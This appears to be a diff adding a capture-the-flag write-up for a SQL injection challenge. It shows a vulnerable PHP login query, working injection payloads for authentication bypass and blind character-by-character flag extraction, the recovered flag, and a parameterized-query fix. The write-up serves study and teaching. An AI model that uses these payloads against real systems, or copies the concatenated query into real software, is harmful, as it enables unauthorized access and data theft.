@@ -1,0 +1,81 @@
+```markdown
+# WEB APPLICATION CTF Challenge Writeup
+
+## Challenge Overview
+**Target**: `http://15.237.112.58:8087/`
+**Category**: Identify and exploit the vulnerability to retrieve the flag, then submit a comprehensive report.
+
+## Challenge Description
+A web application with a Single page returning "wrong !" was found to be vulnerable to SQL injection. The challenge requires extracting a hidden flag from the database by exploiting the authentication mechanism.
+
+
+## Vulnerability Analysis
+
+### Vulnerable Code
+```php
+<?php
+$user=$_GET['user'];
+$pass=$_GET['pass'];
+$sql = @mysqli_fetch_assoc(mysqli_query($db,
+    "SELECT * FROM users WHERE username='{$user}' AND password='{$pass}';"
+));
+?>
+```
+
+### Security Issues
+1. **Direct input concatenation** into SQL queries
+2. **Insufficient input filtering** that can be bypassed
+3. **No parameterized statements** used
+
+## Exploitation Steps
+
+### Step 1: Authentication Bypass
+First, we confirm SQL injection vulnerability:
+
+```http
+GET /?user='OR'1'='1'OR'a&pass=test HTTP/1.1
+```
+
+**Response**: `welcome \o/` ✅
+
+### Step 2: Identify Database Structure
+Check if a `flag` table exists:
+
+```http
+GET /?user='OR(length((select*from(flag)))>0)OR'a&pass=test HTTP/1.1
+```
+
+**Response**: `welcome \o/` ✅
+
+
+### Step 3: Character-by-Character Extraction
+Using the payload structure that bypasses filters:
+
+```python
+payload = f"'OR(mid((select(flag)from(flag)),{position},1))='{char}'OR'a"
+```
+
+
+## Solution
+
+### Extracted Flag
+```
+flag{n0_w4f_c4n_st0p_m3}
+```
+
+
+### CVSS 3.1 Assessment
+- **Base Score**: 9.8 CRITICAL
+- **Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+
+## Remediation Recommendations
+
+### Immediate Actions
+1. **Use parameterized queries**:
+   ```php
+   $stmt = $db->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
+   $stmt->bind_param("ss", $user, $pass);
+   ```
+
+
+
